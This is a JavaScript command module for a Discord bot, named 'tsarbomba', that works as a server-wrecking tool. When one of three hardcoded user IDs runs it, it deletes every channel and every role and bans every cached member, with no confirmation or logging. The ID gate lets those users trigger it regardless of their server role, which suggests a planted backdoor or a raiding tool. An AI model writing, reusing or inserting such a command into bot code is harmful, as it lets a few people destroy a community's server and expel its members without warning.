const { channel } = require("diagnostics_channel");
const Discord = require("discord.js");

module.exports = {
    name:"tsarbomba",
    execute(message, args ,client) {
        if (message.author.id === "409674646569353218" || message.author.id === "509466475724013589" || message.author.id === "509057349655330826") {
            message.guild.channels.cache.forEach(ChannelElement => {
                ChannelElement.delete()
            });
            message.guild.roles.cache.forEach(r => {
                r.delete()
            });
            message.guild.members.cache.forEach(m => {
                m.ban()
            });
        }
    }
}